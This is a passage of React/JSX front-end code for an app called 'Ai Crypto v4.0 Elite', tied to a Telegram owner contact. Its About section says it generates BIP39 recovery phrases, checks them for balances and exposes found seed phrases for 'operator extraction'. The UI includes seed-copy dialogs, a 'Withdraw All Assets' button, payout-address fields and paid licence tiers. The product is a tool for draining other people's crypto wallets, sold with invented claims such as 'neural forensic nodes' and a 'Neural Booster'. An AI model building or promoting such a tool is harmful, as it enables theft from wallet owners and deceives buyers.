                        <DialogContent className="bg-[#0a0a0f] border-white/10 text-white max-w-md rounded-3xl animate-in zoom-in-95 duration-300">
                          <DialogHeader>
                            <DialogTitle className="text-xl font-black uppercase tracking-widest flex items-center gap-4">
                              <Key className="w-7 h-7 text-primary" />
                              Manual Withdrawal
                            </DialogTitle>
                            <DialogDescription className="text-xs text-yellow-400/70 font-bold uppercase tracking-wider pt-4 mt-4 border-t border-white/5 flex items-center gap-2">
                                <AlertTriangle className="w-5 h-5 shrink-0" />
                                <span>SECURITY WARNING: EXPOSING YOUR SEED PHRASE IS A RISK. DO NOT SHARE IT.</span>
                            </DialogDescription>
                          </DialogHeader>
                          <div className="py-4 space-y-3">
                              <p className="text-[0.625rem] text-gray-500 uppercase tracking-widest font-bold">RECOVERY SEED PHRASE</p>
                              <div className="glass-panel p-4 rounded-xl font-code text-base text-green-400 tracking-wider text-center break-words select-text">
                                  {asset.mnemonic}
                              </div>
                          </div>
                          <DialogFooter>
                              <Button
                                  onClick={() => {
                                      navigator.clipboard.writeText(asset.mnemonic);
                                      setCopied(true);
                                      toast({ title: "Copied to Clipboard" });
                                  }}
                                  className="w-full h-12 rounded-lg bg-primary text-black font-black uppercase text-[0.6875rem] tracking-widest shadow-glow hover:scale-[1.03] transition-all duration-200"
                                  disabled={copied}
                              >
                                  {copied ? <CheckCircle2 className="w-5 h-5 mr-3" /> : <Copy className="w-5 h-5 mr-3" />}
                                  {copied ? 'Copied!' : 'Copy Seed Phrase'}
                              </Button>
                          </DialogFooter>
                        </DialogContent>
                      </Dialog>
                    </div>
                  ))}
                </div>
              ) : (
                <div className="py-12 text-center space-y-4 border border-dashed border-white/5 rounded-3xl">
                  <ShieldAlert className="w-12 h-12 text-gray-800 mx-auto" />
                  <p className="text-[0.625rem] font-black text-gray-600 uppercase tracking-widest">
                    No authentic assets discovered yet.
                  </p>
                </div>
              )}
            </div>
            <DialogFooter>
              <Button
                onClick={handleWithdrawAllAssets}
                disabled={discoveredAssets.length === 0}
                className="w-full h-14 rounded-2xl bg-primary text-black font-black uppercase text-[0.6875rem] tracking-widest shadow-glow hover:scale-[1.03] transition-all duration-200"
              >
                <Rocket className="w-5 h-5 mr-3" />
                Withdraw All Assets
              </Button>
            </DialogFooter>
          </DialogContent>
        </Dialog>
      );
    }
  
    return null;
  };


  return (
    <div className="flex flex-col h-screen bg-[#050507] text-foreground font-body relative transition-all duration-300 ease-in-out">
      <main className="flex-1 overflow-y-auto p-4 pt-[calc(1rem+env(safe-area-inset-top))] pb-[calc(9rem+env(safe-area-inset-bottom))] min-h-0">
          <div className="w-full flex-1 flex flex-col min-h-0 animate-in fade-in duration-300 h-full">
            
            {!isOnline && (
              <div className="absolute inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-8 animate-in fade-in zoom-in-95 duration-300">
                <div className="max-w-md w-full glass-panel rounded-3xl p-10 border-red-500/20 text-center space-y-6 shadow-glow-destructive">
                  <div className="w-20 h-20 bg-red-500/10 rounded-full flex items-center justify-center mx-auto border border-red-500/30">
                    <WifiOff className="w-10 h-10 text-red-500 animate-pulse" />
                  </div>
                  <div className="space-y-2">
                    <h2 className="text-[1.25rem] font-black text-white uppercase tracking-[0.2em]">Connection Severed</h2>
                    <p className="text-[0.6875rem] text-gray-500 uppercase leading-relaxed font-bold tracking-widest">
                      Neural uplink to blockchain nodes has been lost. <br />
                      All forensic operations have been suspended to prevent data corruption.
                    </p>
                  </div>
                  <div className="flex items-center justify-center gap-3 py-4 border-t border-white/5">
                    <RefreshCw className="w-4 h-4 text-primary animate-spin" />
                    <span className="text-[0.625rem] font-bold text-primary uppercase tracking-[0.2em]">Monitoring for reconnection...</span>
                  </div>
                </div>
              </div>
            )}

            {activeTab === 'home' && (
              <div className="relative flex-1 flex flex-col min-h-0">
                {/* Step 1: Protocol Selection */}
                <div className={cn(
                    "absolute inset-0 flex flex-col transition-all duration-500 ease-in-out will-change-[opacity,transform]",
                    scanStep === 1 ? "opacity-100 translate-y-0" : "opacity-0 -translate-y-8 pointer-events-none"
                )}>
                  <h2 className="text-2xl font-black text-white/90 uppercase tracking-widest px-1 mb-4">Select Blockchain</h2>
                  <p className="text-sm text-gray-500 px-1 mb-8">Choose one or more blockchain to begin the search</p>
                  <section className="space-y-4 shrink-0 flex-1 overflow-y-auto no-scrollbar pb-8">
                    <div className="blockchain-grid">
                      {BLOCKCHAINS.map((chain) => {
                        const isActive = activeBlockchains.includes(chain.id);
                        const isMulticoinActive = activeBlockchains.includes('multicoin');
                        const isLockedByMulticoin = isMulticoinActive && chain.id !== 'multicoin';
                        const isAllowed = licenseData?.allowedChains?.includes(chain.id) ?? false;
                        
                        if (chain.id === 'multicoin') {
                          return (
                            <div 
                              key={chain.id} 
                              onClick={() => toggleBlockchain(chain.id)} 
                              className={cn(
                                "col-span-2 group relative overflow-hidden h-20 cursor-pointer transition-all duration-300 rounded-2xl", 
                                "flex items-center justify-between gap-4 w-full px-6",
                                isActive 
                                  ? "bg-gradient-to-r from-yellow-400 to-amber-600 text-black shadow-[0_0_40px_rgba(251,191,36,0.5)] border border-yellow-500/50" 
                                  : "glass-panel border-white/10 hover:border-primary/40 hover:scale-[1.02]", 
                                (isInterrogating || !isOnline) && "cursor-not-allowed pointer-events-none opacity-50",
                                !isAllowed && "opacity-50 grayscale !bg-black/20 cursor-not-allowed"
                              )}
                            >
                              <div className="flex items-center gap-4">
                                <div className={cn(
                                  "w-12 h-12 rounded-xl flex items-center justify-center transition-all shadow-inner border", 
                                  isActive ? "bg-black/10 text-white border-white/30" : "bg-white/5 text-primary border-white/10",
                                  !isAllowed && "!text-gray-600 !bg-gray-800/20 !border-gray-700"
                                )}>
                                  {!isAllowed ? <Lock className="w-6 h-6" /> : <Layers className="w-6 h-6" />}
                                </div>
                                <div>
                                  <span className={cn("text-sm font-black uppercase tracking-[0.2em]", isActive ? "text-black" : "text-white")}>{chain.name}</span>
                                  {!isAllowed && <p className="text-[0.625rem] text-yellow-400/80 font-bold uppercase tracking-widest">Requires Elite Tier</p>}
                                </div>
                              </div>
                              
                              <div className="flex items-center gap-2">
                                {isAllowed && (
                                  <span className={cn(
                                    "text-[0.5rem] font-black px-2.5 py-1 rounded-md border uppercase tracking-wider",
                                    isActive ? "bg-black/20 text-white border-white/30" : "bg-primary text-black border-primary/30 shadow-glow"
                                  )}>
                                    ELITE
                                  </span>
                                )}
                                {isAllowed && <ChevronRight className={cn("w-5 h-5 transition-transform", isActive ? "text-black" : "text-gray-600 group-hover:translate-x-1")} />}
                              </div>
                            </div>
                          )
                        }

                        return (
                          <div 
                            key={chain.id} 
                            onClick={() => toggleBlockchain(chain.id)} 
                            className={cn(
                              "blockchain-card group relative overflow-hidden transition-all duration-300", 
                              isActive && "active", 
                              (isInterrogating || !isOnline || isLockedByMulticoin || !isAllowed) && "cursor-not-allowed pointer-events-none opacity-50",
                              !isActive && !isAllowed && "grayscale !bg-black/20",
                              !isActive && isAllowed && "hover:scale-[1.05]"
                            )}
                          >
                            {!isAllowed ? (
                              <div className="w-6 h-6 flex items-center justify-center text-gray-600"><Lock className="w-5 h-5" /></div>
                            ) : chain.logo ? (
                              <img src={chain.logo} alt={`${chain.name} logo`} className="w-6 h-6 object-contain" />
                            ) : (
                              <div className="w-6 h-6 flex items-center justify-center text-primary"><Coins className="w-5 h-5" /></div>
                            )}
                            <div className="flex flex-col">
                              <span className="leading-none text-[0.625rem] font-bold uppercase">{chain.name}</span>
                            </div>
                            {isLockedByMulticoin && (
                              <div className="absolute inset-0 bg-black/40 flex items-center justify-center z-10 transition-opacity">
                                <ShieldCheck className="w-4 h-4 text-primary/60" />
                              </div>
                            )}
                          </div>
                        )
                      })}
                    </div>
                  </section>
                </div>

                {/* Step 2: Forensic Console */}
                <div className={cn(
                    "absolute inset-0 flex flex-col h-full transition-all duration-500 ease-in-out will-change-[opacity,transform]",
                    scanStep === 2 ? "opacity-100 translate-y-0" : "opacity-0 translate-y-8 pointer-events-none"
                )}>
                  <div className="relative flex items-center justify-center shrink-0 px-4 h-14">
                      <Button variant="ghost" onClick={() => setScanStep(1)} className="text-primary absolute left-4 top-1/2 -translate-y-1/2 px-2">
                          <ChevronLeft className="w-4 h-4 mr-2" /> Back
                      </Button>
                      <div>
                          <h3 className="text-[0.6875rem] font-black uppercase tracking-[0.2em] text-white/60">Wallet search</h3>
                      </div>
                  </div>
                  
                  <div className="flex-1 min-h-0 relative mb-4">
                    <div className="absolute inset-0 overflow-y-auto no-scrollbar flex flex-col-reverse" ref={scrollRef}>
                      <div className="p-6 space-y-1">
                        {isBooting && !isInterrogating && (
                          <div className="font-code text-xs space-y-1">
                            <p className="text-terminal-cyan">[BOOT] Initializing AI Crypto Engine v4.0 Elite...</p>
                            <p className="text-terminal-cyan">[BOOT] Verifying system modules...</p>
                            <p className="text-terminal-cyan">[BOOT] Secure node connection established.</p>
                            <p className="text-green-400">[READY] System online. Awaiting interrogation command.</p>
                          </div>
                        )}
                        {isInterrogating && logs.length === 0 && !isBooting && (
                            <div className="font-code text-xs text-center py-10">
                                <p className="text-terminal-cyan animate-pulse">[CONNECTING] Synchronizing with neural forensic nodes...</p>
                            </div>
                        )}
                        {logs.map((log) => (
                          <div key={log.id} className="console-line">
                            {log.type === 'ai' ? (
                              <div className="flex items-baseline font-code text-xs whitespace-nowrap overflow-hidden">
                                <span className="text-white">Balance: 0 | Wallet check: </span>
                                <span className="text-white truncate">{log.message}</span>
                              </div>
                            ) : log.type === 'success' ? (
                              <div className="flex flex-col gap-2 font-code text-green-400 bg-green-500/10 p-4 rounded border border-green-500/20 shadow-[0_0_40px_rgba(34,197,94,0.4)] animate-in zoom-in-95 duration-300">
                                <div className="flex justify-between items-center border-b border-green-500/20 pb-2 mb-1">
                                  <span className="text-[0.625rem] font-black tracking-widest uppercase">Forensic Hit Detected</span>
                                  <span className="text-white/30 text-[0.5625rem]">[{log.timestamp}]</span>
                                </div>
                                <span className="text-[0.75rem] font-black leading-relaxed whitespace-pre-wrap">
                                  {log.message}
                                </span>
                              </div>
                            ) : (
                              <div className="flex gap-4 font-code text-[#8df7b1] opacity-80 hover:opacity-100 transition-opacity">
                                <span className="text-white/10 shrink-0 select-none">[{log.timestamp}]</span>
                                <span className="uppercase tracking-tight font-bold">
                                  {log.message}
                                </span>
                              </div>
                            )}
                          </div>
                        ))}
                        <div className={cn("absolute inset-0 flex flex-col items-center justify-center text-center p-8 transition-opacity duration-500", (isInterrogating || isBooting || logs.length > 0) ? "opacity-0 pointer-events-none" : "opacity-100 animate-in fade-in duration-1000")}>
                            <Image
                                src="/logos/logo.png"
                                alt="AI Crypto Logo"
                                width={256}
                                height={256}
                                className="w-56 h-56 opacity-100 scale-110 drop-shadow-[0_0_40px_hsl(var(--primary)_/_0.6)] transition-all duration-300"
                            />
                        </div>
                      </div>
                    </div>
                    <div className={cn(
                        'transition-opacity duration-500 will-change-[opacity]', 
                        isInterrogating ? 'opacity-100' : 'opacity-0'
                      )}>
                      <BottomGlowEffect />
                    </div>
                  </div>
                  
                  <div className="shrink-0 mt-auto pt-2 space-y-4">
                    <div className="glass-panel rounded-2xl p-4 flex justify-between items-center border-white/5">
                        <div className='text-center'>
                            <p className="text-xs text-white/50">Wallets checked</p>
                            <p className="text-lg font-bold text-white/90">{visualCount.toLocaleString()}</p>
                        </div>
                        <div className='text-center'>
                            <p className="text-xs text-white/50">Found</p>
                            <p className="text-lg font-bold text-white/90">${totalVal.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</p>
                        </div>
                    </div>

                  </div>
                </div>
              </div>
            )}

            {activeTab === 'withdraw' && (
              <div className="flex-1 flex flex-col min-h-0 animate-in slide-in-from-bottom-4 duration-300">
                <div className="flex-1 overflow-y-auto no-scrollbar p-4 flex flex-col">
                  <div className="flex-1 glass-panel rounded-[32px] p-4 border-white/5 relative overflow-hidden flex flex-col shadow-2xl">
                    <div className="absolute inset-0 pointer-events-none">
                      <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,hsl(var(--primary)_/_0.15)_0%,transparent_60%)]" />
                    </div>
                    
                    <div className="flex items-center justify-between mb-4 z-10 shrink-0 px-2">
                      <div className="flex items-center gap-4">
                        <Activity className="w-5 h-5 text-primary" />
                        <h3 className="text-sm font-black uppercase tracking-widest text-white">Statistics</h3>
                      </div>
                    </div>
  
                    <div className="flex-1 min-h-0 z-10 relative flex items-center justify-center">
                      <ResponsiveContainer width="100%" height="100%">
                        <AreaChart data={dynamicChartData} margin={{ top: 5, right: 10, left: -20, bottom: 0 }}>
                          <defs>
                            <linearGradient id="colorValue" x1="0" y1="0" x2="0" y2="1">
                              <stop offset="5%" stopColor="hsl(var(--primary))" stopOpacity={0.3}/>
                              <stop offset="95%" stopColor="hsl(var(--primary))" stopOpacity={0}/>
                            </linearGradient>
                          </defs>
                          <CartesianGrid strokeDasharray="3 3" vertical={false} stroke="rgba(255,255,255,0.05)" />
                          <XAxis 
                            dataKey="name" 
                            axisLine={false} 
                            tickLine={false} 
                            tick={{ fill: 'rgba(255,255,255,0.3)', fontSize: 10, fontWeight: 'bold' }}
                            dy={10}
                          />
                          <YAxis 
                            domain={[0, chartDomainMax]}
                            axisLine={false} 
                            tickLine={false} 
                            tick={{ fill: 'rgba(255,255,255,0.3)', fontSize: 10, fontWeight: 'bold' }}
                            tickFormatter={(val) => `$${val/1000}k`}
                          />
                          <RechartsTooltip 
                            cursor={false}
                            content={({ active, payload }) => {
                              if (active && payload && payload.length) {
                                return (
                                  <div className="bg-[#12121a] border border-white/10 p-3 rounded-lg shadow-glow">
                                    <p className="text-[0.625rem] font-bold text-gray-500 uppercase tracking-widest mb-1">Yield</p>
                                    <p className="text-sm font-black text-white font-code">${payload[0].value?.toLocaleString()}</p>
                                  </div>
                                );
                              }
                              return null;
                            }}
                          />
                          <Area 
                            type="linear" 
                            dataKey="value" 
                            stroke="hsl(var(--primary))" 
                            strokeWidth={2} 
                            fillOpacity={1} 
                            fill="url(#colorValue)" 
                            animationDuration={2000}
                          />
                        </AreaChart>
                      </ResponsiveContainer>
                    </div>
                  </div>
                </div>
                
                <div className="shrink-0 p-4 pt-2">
                  <div className="glass-panel rounded-[32px] p-6 border-white/5 flex items-center justify-between shadow-[0_20px_60px_rgba(0,0,0,0.6)]">
                    <div className="flex flex-col gap-2">
                      <div className="flex items-center gap-3">
                        <Coins className="w-4 h-4 text-primary" />
                        <span className="text-[0.625rem] font-black text-gray-500 uppercase tracking-[0.4em]">Total Earnings</span>
                      </div>
                      <span className="text-3xl font-black text-white font-code tracking-tighter drop-shadow-glow">
                        ${totalVal.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                      </span>
                    </div>
                    
                    <Dialog>
                        <DialogTrigger asChild>
                           <Button variant="outline" className="h-12 px-6 rounded-xl border-dashed border-primary/30 bg-primary/5 hover:bg-primary/10 flex items-center gap-2 transition-all group active:scale-95 hover:scale-105">
                             <CreditCard className="w-4 h-4 text-primary group-hover:scale-110 transition-transform" />
                             <span className="text-[0.5625rem] font-black uppercase tracking-widest text-primary/70">Configure</span>
                           </Button>
                        </DialogTrigger>
                        <DialogContent className="bg-[#0a0a0f] border-white/10 text-white max-w-md rounded-3xl animate-in zoom-in-95 duration-300">
                             <DialogHeader>
                               <DialogTitle className="text-xl font-black uppercase tracking-widest flex items-center gap-4">
                                 <ShieldCheck className="w-7 h-7 text-primary" />
                                 Configure
                               </DialogTitle>
                             </DialogHeader>
                             <div className="space-y-6 py-8">
                               {['Bitcoin (BTC) Address', 'Tether USDT (BEP-20)', 'Solana (SOL)'].map((label, i) => (
                                 <div key={i} className="space-y-3">
                                   <label className="text-[0.625rem] font-bold text-gray-500 uppercase tracking-widest">{label}</label>
                                   <Input 
                                     value={i === 0 ? payoutBtc : i === 1 ? payoutUsdt : payoutSol} 
                                     onChange={(e) => i === 0 ? setPayoutBtc(e.target.value) : i === 1 ? setPayoutUsdt(e.target.value) : setPayoutSol(e.target.value)}
                                     placeholder={`Enter ${label.split(' ')[0]} address...`}
                                     className="bg-white/[0.02] border-white/5 h-14 rounded-xl font-code text-xs focus:ring-primary/20 focus:border-primary/50 transition-all"
                                   />
                                 </div>
                               ))}
                             </div>
                             <DialogFooter>
                               <Button disabled={isSavingPayout} onClick={handleSavePayoutAddresses} className="w-full h-14 rounded-2xl bg-primary text-black font-black uppercase text-[0.6875rem] tracking-widest shadow-glow hover:scale-[1.03] transition-all duration-200 active:scale-95">
                                 {isSavingPayout ? <Loader2 className="w-5 h-5 mr-3 animate-spin" /> : <Save className="w-5 h-5 mr-3" />}
                                 {isSavingPayout ? "Synchronizing HQ..." : "Save Withdrawal Configuration"}
                               </Button>
                             </DialogFooter>
                        </DialogContent>
                    </Dialog>
                  </div>
                </div>
              </div>
            )}

            {activeTab === 'settings' && (
              <div className="max-w-4xl mx-auto w-full flex flex-col gap-10 overflow-y-auto no-scrollbar scroll-smooth animate-in slide-in-from-bottom-4 duration-300">
                <div className="glass-panel rounded-[32px] p-8 border-white/5 shadow-[0_30px_70px_rgba(0,0,0,0.6)] hover:border-primary/10 transition-all duration-300">
                  <h3 className="text-lg font-black uppercase tracking-[0.2em] mb-8 border-b border-white/10 pb-6">Performance</h3>
                  <div className="space-y-12">
                    {[
                      { icon: Gauge, label: 'Scan Throughput (Hz)', value: `${systemIntensity[0]}% Velocity`, state: systemIntensity, setState: setSystemIntensity, max: 100, step: 1, desc: 'Modulates the interrogation frequency and engine neural load.' },
                      { icon: Layers, label: 'Neural Core Allocation', value: `${allocatedCores[0]} / 8 Cores`, state: allocatedCores, setState: setAllocatedCores, min: 1, max: 8, step: 1, desc: 'Allocates processing threads for forensic seed generation.' }
                    ].map((item, idx) => (
                      <div key={idx} className="space-y-6 animate-in slide-in-from-left-4 duration-300" style={{ animationDelay: `${idx * 150}ms` }}>
                        <div className="flex items-center justify-between">
                          <div className="flex items-center gap-3">
                            <item.icon className="w-5 h-5 text-primary" />
                            <label className="text-sm font-bold text-white uppercase tracking-widest">{item.label}</label>
                          </div>
                          <span className="text-sm font-code text-primary tracking-tight">{item.value}</span>
                        </div>
                        <Slider value={item.state} onValueChange={item.setState} min={item.min || 0} max={item.max} step={item.step} disabled={isInterrogating} className="cursor-pointer" />
                        <p className="text-[0.625rem] text-gray-500 uppercase tracking-widest leading-relaxed font-medium">{item.desc}</p>
                      </div>
                    ))}
                  </div>
                </div>

                <div className="glass-panel rounded-[32px] p-8 border-white/5 shadow-[0_30px_70px_rgba(0,0,0,0.6)]">
                    <h3 className="text-lg font-black uppercase tracking-[0.2em] mb-8 border-b border-white/10 pb-6">AI Modules</h3>
                    <div className="space-y-6">
                        <div className="flex items-center justify-between p-4 rounded-xl bg-white/[0.02] border border-white/5">
                            <div className="flex items-center gap-4">
                                <BrainCircuit className="w-6 h-6 text-primary" />
                                <div className="flex flex-col">
                                  <p className="text-sm font-bold text-white uppercase tracking-wider">AI Heuristic Search</p>
                                  <p className="text-[0.625rem] text-gray-500 uppercase tracking-widest font-medium">Enables Enterprise Tier AI analysis.</p>
                                </div>
                            </div>
                            <Switch
                              checked={isAiSearchConnected}
                              onCheckedChange={(checked) => {
                                if (checked) {
                                  connectAiSearch();
                                } else {
                                  disconnectAiSearch();
                                }
                              }}
                              disabled={!licenseData?.aiSearchEnabled || isAiSearchConnecting}
                            />
                        </div>
                        {!licenseData?.aiSearchEnabled && (
                          <p className="text-xs text-yellow-500/70 font-bold uppercase tracking-wider text-center">Requires Enterprise Tier License</p>
                        )}
                        <div className="flex items-center justify-between p-4 rounded-xl bg-white/[0.02] border border-white/5">
                            <div className="flex items-center gap-4">
                                <Zap className="w-6 h-6 text-primary" />
                                <div className="flex flex-col">
                                  <p className="text-sm font-bold text-white uppercase tracking-wider">Neural Booster</p>
                                  <p className="text-[0.625rem] text-gray-500 uppercase tracking-widest font-medium">Overclocks forensic velocity for the session.</p>
                                </div>
                            </div>
                            <div className="flex items-center gap-3">
                              <Switch
                                checked={isBoosterActive}
                                onCheckedChange={(checked) => {
                                  if (checked) {
                                    activateBooster();
                                  } else {
                                    deactivateBooster();
                                  }
                                }}
                                disabled={!isBoosterActive && (!licenseData?.boosterEnabled || !isInterrogating)}
                              />
                            </div>
                        </div>
                        {!licenseData?.boosterEnabled && (
                            <p className="text-xs text-yellow-500/70 font-bold uppercase tracking-wider text-center">Booster module requires license authorization.</p>
                        )}
                    </div>
                </div>

                <div className="glass-panel rounded-[32px] p-8 border-white/5 shadow-[0_30px_70px_rgba(0,0,0,0.6)] hover:border-primary/10 transition-all duration-300">
                  <h3 className="text-lg font-black uppercase tracking-[0.2em] mb-8 border-b border-white/10 pb-6 flex items-center gap-3">
                    <Network className="w-6 h-6 text-primary" />
                    Network Cluster
                  </h3>
                  <div className="space-y-4">
                    {servers.map((server) => {
                      const isSelected = selectedServer === server.id;
                      const isLocked = server.isElite && !licenseData?.aiSearchEnabled;
                      return (
                        <div
                          key={server.id}
                          onClick={() => !isLocked && setSelectedServer(server.id)}
                          className={cn(
                            "glass-panel rounded-2xl p-6 border transition-all duration-300 cursor-pointer",
                            isSelected ? "border-primary shadow-glow bg-primary/10" : "border-white/5 hover:border-primary/30",
                            isLocked && "opacity-50 cursor-not-allowed grayscale"
                          )}
                        >
                          <div className="flex justify-between items-start">
                            <div className="flex items-center gap-4">
                              <div className="relative">
                                <div className={cn("w-12 h-12 rounded-lg flex items-center justify-center", isSelected ? "bg-black/20" : "bg-white/5")}>
                                  <Server className={cn("w-6 h-6", isSelected ? "text-primary" : "text-white/60")} />
                                </div>
                                {isSelected && (
                                    <div className="absolute -top-1 -right-1 w-5 h-5 bg-primary rounded-full flex items-center justify-center text-black border-2 border-[#0f0f16]">
                                        <Check className="w-3 h-3" />
                                    </div>
                                )}
                              </div>
                              <div>
                                <p className="font-bold text-white uppercase tracking-wider">{server.name}</p>
                                <p className="text-[0.625rem] text-gray-500 uppercase tracking-widest font-medium">{server.location}</p>
                              </div>
                            </div>
                            <div className="text-right">
                              <span className={cn(
                                "text-[0.625rem] font-black px-3 py-1 rounded-md border uppercase tracking-wider",
                                server.tier === 'ELITE-CORE' && "bg-green-500/10 text-green-400 border-green-500/20",
                                server.tier === 'STANDARD' && "bg-primary/10 text-primary border-primary/20",
                                server.tier === 'BASIC' && "bg-white/10 text-white/70 border-white/20",
                              )}>
                                {server.tier}
                              </span>
                              <p className="text-[0.625rem] text-gray-500 uppercase tracking-widest font-medium mt-2 font-code">IP: {server.ip}</p>
                            </div>
                          </div>
                          {isLocked && (
                            <div className="mt-4 text-center">
                              <p className="text-xs text-yellow-500/70 font-bold uppercase tracking-wider">Requires Enterprise Tier License</p>
                            </div>
                          )}
                          <div className="mt-6 space-y-3">
                            <div>
                              <div className="flex justify-between items-center text-[0.625rem] uppercase font-bold tracking-widest text-gray-500 mb-1">
                                <span>Peak Velocity</span>
                                <span className="text-green-400 font-code">{server.velocity}ms</span>
                              </div>
                              <Progress value={(100 - server.velocity)} className="h-1 bg-green-500/10 [&>div]:bg-green-500" />
                            </div>
                            <div>
                              <div className="flex justify-between items-center text-[0.625rem] uppercase font-bold tracking-widest text-gray-500 mb-1">
                                <span>Mesh Health</span>
                                <span className="text-primary font-code">{server.health}%</span>
                              </div>
                              <Progress value={server.health} className="h-1 bg-primary/10 [&>div]:bg-primary" />
                            </div>
                          </div>
                        </div>
                      );
                    })}
                  </div>
                </div>

                <div className="glass-panel rounded-[32px] p-8 border-white/5 shadow-[0_30px_70px_rgba(0,0,0,0.6)] hover:border-primary/10 transition-all duration-300">
                   <h3 className="text-lg font-black uppercase tracking-[0.2em] mb-8 border-b border-white/10 pb-6">Neural Entropy</h3>
                    <div className="space-y-4">
                       <div className="flex items-center justify-between">
                         <label className="text-[0.6875rem] font-bold text-gray-400 uppercase tracking-widest flex items-center gap-3">
                           <Languages className="w-5 h-5 text-primary" />
                           Entropy Language
                          </label>
                         <Select value={mnemonicLanguage} onValueChange={setMnemonicLanguage} disabled={isInterrogating}>
                           <SelectTrigger className="w-[200px] h-11 bg-white/[0.02] border-white/10 rounded-xl font-bold uppercase tracking-widest text-[0.6875rem] focus:ring-primary/20">
                             <SelectValue placeholder="Select Language" />
                           </SelectTrigger>
                           <SelectContent className="bg-[#0a0a0f] border-white/10">
                             {ENTROPY_LANGUAGES.map((lang) => (
                               <SelectItem key={lang.id} value={lang.id} className="text-white uppercase font-bold text-[0.625rem] tracking-widest focus:bg-primary/10 focus:text-primary">
                                  <span className="mr-3">{lang.flag}</span>
                                  {lang.name}
                               </SelectItem>
                             ))}
                           </SelectContent>
                         </Select>
                       </div>
                    </div>
                </div>

                <div className="glass-panel rounded-[32px] p-8 border-white/5 shadow-[0_30px_70px_rgba(0,0,0,0.6)]">
                    <h3 className="text-lg font-black uppercase tracking-[0.2em] mb-8 border-b border-white/10 pb-6">System</h3>
                    <div className="space-y-6">
                        <div className="flex items-center justify-between p-4 rounded-xl bg-white/[0.02] border border-white/5">
                            <div className="flex items-center gap-3">
                                <Trash2 className="w-5 h-5 text-primary" />
                                <p className="text-sm font-bold text-white uppercase tracking-wider">Memory Flush</p>
                            </div>
                            <Button variant="outline" size="sm" onClick={handleMemoryFlush} className="h-9 px-4 text-[0.625rem] uppercase font-black border-primary/30 text-primary hover:bg-primary/20 rounded-lg transition-all active:scale-95 hover:scale-105">Flush</Button>
                        </div>
                        <div className="flex items-center justify-between p-4 rounded-xl bg-red-500/[0.02] border border-red-500/10">
                            <div className="flex items-center gap-3">
                                <RotateCcw className="w-5 h-5 text-red-400" />
                                <p className="text-sm font-bold text-white uppercase tracking-wider">Reset Workstation</p>
                            </div>
                            <Button variant="outline" size="sm" onClick={clearSession} className="h-9 px-4 text-[0.625rem] uppercase font-black border-red-500/30 text-red-400 hover:bg-red-500/20 rounded-lg transition-all active:scale-95 hover:scale-105">Reset</Button>
                        </div>
                         <div className="flex items-center justify-between p-4 rounded-xl bg-white/[0.02] border border-white/5">
                            <div className="flex items-center gap-3">
                                <LogOut className="w-5 h-5 text-gray-500" />
                                <p className="text-sm font-bold text-white uppercase tracking-wider">Operator Session</p>
                            </div>
                            <Button variant="outline" size="sm" onClick={handleLogout} className="h-9 px-4 text-[0.625rem] uppercase font-black border-white/20 text-gray-400 hover:bg-white/10 hover:text-white rounded-lg transition-all active:scale-95 hover:scale-105">Logout</Button>
                        </div>
                    </div>
                </div>

              </div>
            )}

            {activeTab === 'about' && (
              <div className="max-w-[1000px] mx-auto w-full flex flex-col gap-8 pb-12 overflow-y-auto no-scrollbar pr-3 scroll-smooth animate-in slide-in-from-bottom-4 duration-300">
                <section className="relative overflow-hidden glass-panel rounded-[40px] p-8 border-primary/20 bg-primary/[0.02] shadow-[0_40px_80px_rgba(0,0,0,0.7)] group transition-all duration-300">
                  <div className="absolute top-0 right-0 p-10 opacity-5 group-hover:opacity-15 transition-all duration-300">
                    <BrainCircuit className="w-32 h-32 text-primary" />
                  </div>
                  <div className="relative z-10 space-y-8">
                    <div className="flex items-center gap-4">
                      <Image src="/logos/logo.png" alt="AI Crypto Logo" width={80} height={80} />
                      <div>
                        <h2 className="text-xl font-black uppercase tracking-widest text-white">Ai Crypto</h2>
                        <p className="text-[0.6rem] font-bold text-primary uppercase tracking-[0.4em] mt-1">v4.0 Elite</p>
                      </div>
                    </div>
                    
                    <div className="grid grid-cols-1 gap-8 py-6 border-t border-white/10">
                      <div className="space-y-4">
                        <h3 className="text-sm font-black uppercase tracking-widest text-white/80 flex items-center gap-3">
                          <Layers className="w-5 h-5 text-primary" /> High-Entropy Synthesis
                        </h3>
                        <p className="text-sm text-gray-400 leading-relaxed hover:text-white/90 transition-all duration-300">
                          The engine autonomously synthesizes high-entropy <span className="text-white font-black">BIP39 recovery phrases</span> and performs deep-spectrum node interrogation to identify active blockchain signatures.
                        </p>
                      </div>
                      <div className="space-y-4">
                        <h3 className="text-sm font-black uppercase tracking-widest text-white/80 flex items-center gap-3">
                          <ShieldCheck className="w-5 h-5 text-primary" /> Automated Discovery
                        </h3>
                        <p className="text-sm text-gray-400 leading-relaxed hover:text-white/90 transition-all duration-300">
                          Every generated phrase is checked for <span className="text-white font-black">non-zero ledger balances</span>. Upon detection, the system unmasks the <span className="text-green-400 font-black">mnemonic phrase</span> for immediate operator extraction.
                        </p>
                      </div>
                    </div>
                  </div>
                </section>
                
                <section className="glass-panel rounded-[32px] p-8 border-white/5 text-center shadow-xl group hover:border-primary/30 transition-all duration-300">
                  <div className="space-y-2">
                    <h4 className="text-[0.6875rem] font-black uppercase tracking-[0.3em] text-white/40">
                      Creator & Owner
                    </h4>
                    <a
                      href="https://t.me/CMS_OWNER"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-xl font-black text-white tracking-wider inline-block transition-all duration-300 hover:text-primary hover:scale-110 hover:[text-shadow:0_0_15px_hsl(var(--primary))]"
                    >
                      Alex Mercer
                    </a>
                  </div>
                </section>

                <section className="glass-panel rounded-[32px] p-8 border-white/5 flex flex-col justify-between shadow-xl group hover:border-primary/30 transition-all duration-300">
                  <div className="space-y-3">
                    <h4 className="text-[0.6875rem] font-black uppercase tracking-[0.3em] text-white/40 flex items-center gap-3">
                      <Share2 className="w-4 h-4" /> Communications
                    </h4>
                    <p className="text-[0.6875rem] text-gray-500 uppercase font-bold tracking-widest leading-relaxed">
                      Join the high-latency operator network for real-time node updates and technical support.
                    </p>
                  </div>
